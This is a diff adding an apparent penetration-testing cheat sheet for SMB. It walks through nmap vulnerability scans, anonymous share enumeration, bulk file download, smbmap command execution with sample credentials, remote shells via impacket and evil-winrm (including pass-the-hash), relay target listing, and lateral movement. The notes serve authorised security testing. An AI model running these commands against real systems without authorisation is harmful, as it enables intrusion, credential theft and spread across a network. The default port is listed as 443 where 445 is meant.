@@ -1,0 +1,265 @@
+---
+title: 139,443 SMB
+parent: Services
+grand_parent: Red Team
+nav_order: 139
+---
+# SMB
+
+---
+
+## Default Port
+
+- 139
+- 443
+
+---
+
+## Service Info
+
+SMB (Server Message Block) is a Windows file and resource sharing protocol.
+
+It is commonly used for:
+- file and folder sharing
+- domain authentication (Active Directory environments)
+- remote administration and lateral movement
+
+SMB is frequently exposed internally and is a primary target for credential-based attacks and NTLM abuse.
+
+### SMB Version Info
+```bash
+SMB1 => Win2000 / XP / 2003
+SMB2.0 => Vista / 2008
+SMB2.1 => Win7 / 2008R2
+SMB3.0 => Win8 /  2012
+SMB 3.02 => Win8.1 / 2012R2
+
+# Configuration tips
+# Can be usefull to configure /etc/samba/smb.conf with:
+client min protocol = SMB2
+client max protocol = SMB3
+
+# Then
+service smbd restart
+```
+
+---
+
+## Common security issues
+
+- Anonymous or guest access enabled (null sessions)
+- Weak or reused credentials
+- SMB signing not required (enables relay attacks)
+- Sensitive file exposure in shared directories
+- Misconfigured share permissions (read/write access)
+- NTLM relay vulnerability (if signing is disabled)
+- Outdated SMB versions (e.g. SMBv1 vulnerabilities like MS17-010)
+- Credential leakage via scripts, backups, or config files
+
+---
+
+## 1. Initial Scan
+
+### Basic
+
+```bash
+nmap -p 139,445 --script smb* <IP>
+```
+
+### Hard
+
+```zsh
+nmap -n -sV --version-intensity=5 -sU -sS -Pn -p T:139,445,U:137 --script=xxx <IP>
+```
+
+### Enum
+- smb-enum-domains
+- smb-enum-groups
+- smb-enum-processes
+- smb-enum-sessions
+- smb-os-discovery
+- smb-server-stats
+- smb-system-info
+
+### Vulns
+- smb-vuln-conficker (dangerous, can crash target)
+- smb-vuln-ms06-025 (Buffer overflow in RRAS)
+- smb-vuln-ms07-029 (Buffer overflow which can crash the RPC intrface in the DNS Server)
+- smb-vuln-ms08-067 (Buffer overflow/RCE. Dangerous, can crash the target)
+- smb-vuln-ms10-054 (Remote Memory Corruption. Result is BSOD -> DANGEROUS)
+- smb-vuln-ms10-061 (Print vulnerability. Safe and can\'t crash the target)
+- smb-vuln-ms17-010 (RCE, just checking if vulnerable)
+
+👉 Check:
+
+* SMB version
+* Signing (required / not required)
+* Shares
+
+---
+
+## 2. Anonymous Enumeration
+
+```bash
+smbclient -L //<IP>/ -N
+```
+
+```bash
+enum4linux -a <IP>
+```
+
+```zsh
+enum4linux -a -R 500-600,950-1150 
+```
+ (identifier le nom/domaine + users + shares)
+ 
+```bash
+smbmap -H <IP>
+```
+
+👉 Look for:
+
+* Accessible shares
+* Usernames
+* Domain info
+
+---
+
+## 3. Share Access
+
+```bash
+smbclient //<IP>/<SHARE> -N
+```
+
+```bash
+smbclient //<IP>/<SHARE> -U <DOMAIN>/<USER>
+```
+
+```zsh
+smbclient \\\\x.x.x.x\\share
+```
+
+```zsh
+smbclient -U “” -N \\\\IP\\IPC$
+```
+
+```zsh
+smbclient -U “DOMAINNAME\Username” \\\\IP\\IPC$ password
+```
+
+
+### Download Files
+
+```bash
+recurse ON
+prompt OFF
+mget *
+```
+
+#### Oneliner
+```zsh
+smbclient //192.168.243.248/transfer -U guest -c "prompt OFF;recurse ON;mget *"
+```
+
+👉 Search for:
+
+* Passwords
+* Config files
+* Scripts
+* Backup files
+
+---
+
+## [4. smbmap](../tools/smbmap)
+
+```zsh
+smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
+```
+
+👉 Common findings:
+
+* `.txt`, `.xml`, `.config`
+* scripts with credentials
+* backup files
+
+👉 If creds found → try:
+
+* [WinRM](winrm.md)
+* [SSH](ssh.md)
+* [MSSQL](mssql.md)
+
+---
+
+## 5. Authenticated Enumeration
+
+```zsh
+smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
+```
+
+```zsh
+smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
+```
+
+```bash
+nxc smb <IP> -u <USER> -p <PASS>
+```
+
+---
+## 6. Remote Command Execution
+
+### If admin access:
+
+```bash
+impacket-psexec <USER>:<PASS>@<IP>
+```
+
+or
+
+```bash
+impacket-wmiexec <USER>:<PASS>@<IP>
+```
+
+or
+
+```bash
+evil-winrm -i <IP> -u <USER> -p <PASS>
+```
+
+```bash
+evil-winrm -i <IP> -u <USER> -H <HASH>
+```
+
+👉 If shell obtained → [Privilege Escalation](../04_privesc/windows.md)
+
+---
+
+## 7. SMB Relay (if signing disabled)
+
+```bash
+nxc smb <IP> --gen-relay-list targets.txt
+```
+
+👉 Then use relay attack tools
+
+---
+
+## 8. No Credentials?
+
+👉 Try:
+
+* Password spraying → [Password Attacks](../03_initial_access/password_attacks.md)
+* Null sessions
+* Guest access
+
+---
+
+## 9. Lateral Movement
+
+👉 Reuse creds:
+
+* Other hosts
+* Other services
+
+→ Expand access
+
+---
